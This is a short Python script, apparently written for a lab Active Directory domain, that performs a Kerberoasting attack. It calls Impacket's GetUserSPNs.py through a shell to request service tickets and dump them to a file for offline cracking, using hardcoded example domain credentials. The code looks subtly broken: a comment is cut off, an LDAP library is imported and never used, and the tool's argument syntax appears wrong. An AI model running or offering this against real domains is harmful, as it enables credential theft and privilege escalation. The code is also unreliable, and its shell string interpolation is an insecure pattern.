import subprocess
from ldap3 import Server, Connection, SUBTREE

def find_and_kerberoast_objects(username, password, domain, dc_ip):
    try:
        # Connect to the Domain Controlle
            cmd = f"GetUserSPNs.py -request -dc-ip {dc_ip} -outputfile krbtickets.txt -u {domain}/{username}:{password}"
            subprocess.run(cmd, shell=True)
    except Exception as e:
        print(f"Error while searching for kerberoastable objects or Kerberoasting: {e}")

# Example usage:
username = "ajman"
password = "DomainAdmin123!"
domain = "snaplabs.local"
dc_ip = "10.10.0.86"  # Replace with your domain controller's IP address

find_and_kerberoast_objects(username, password, domain, dc_ip)